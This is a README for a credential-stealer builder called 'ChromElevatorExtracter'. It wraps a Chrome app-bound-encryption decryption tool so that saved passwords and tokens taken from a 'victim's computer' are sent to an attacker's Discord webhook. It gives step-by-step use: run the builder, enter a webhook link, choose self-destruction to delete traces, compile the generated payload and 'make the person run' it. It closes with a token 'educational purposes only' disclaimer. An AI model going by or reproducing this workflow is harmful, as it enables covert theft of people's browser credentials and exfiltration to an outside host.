# ChromElevatorExtracter

This is an project i have been recently working on. Its and program for the project chromelevator on **https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption**.

On the page you can read what it does. The only problem this program has is that the output folder which contains the passwords, tokens etc stay on the victim's computer. My program changes that it sends the information to an discord webhook what you set up. 

## Contents
- [How does it work?](#how-does-it-work?)
- [How to create an webhook?](#how-to-create-an-webhook)
- [Folder config](#folder-configuration)
- [Updates](#updates)

## How does it work?

To answer your question its actually simple.

Run this command in powershell to start it.
```
.\builder.exe

```
or
```
builder.exe
```
To Start it in cmd
```
Whats your webhook link?
Here you just give your webhook  link.

How is your .exe called?
here you input what your .exe is called with extension of .exe behind the name for it to recognise the file

Do you want self destruction this makes it so it deletes the chromelevator file? y/n
Here if you do yes it deletes itself after running.
```
## How to create an webhook?

If you dont know how to get your webhook link do the following:
Go to your server > Server Settings > Integrations > Webhook
If you dont have one then create one if you did copy the url and paste in the tool 

## Folder configuration

then you need to compile the payload.py that is created.

then you need to put your compiled exe and the chromelevator in the same folder and then make the person run the compiled payload you made.

```
When run > launches chromelevator then it gets the .json files like passwords.json tokens.json etc.
Then > it send the contents of that to your discord webhook
```

## Updates

I started this project 3 days ago so you may experience some bugs or other things I'm working on some more features that i will release in the future. If you want to stay updated then join my [**discord**](https://discord.gg/pPQwpG7UBs) for updates giveaways and more!

I am **not** responsible for any damages made. Use this program for **educational purposes only** or on machine's you have **explicit permission** to do this!
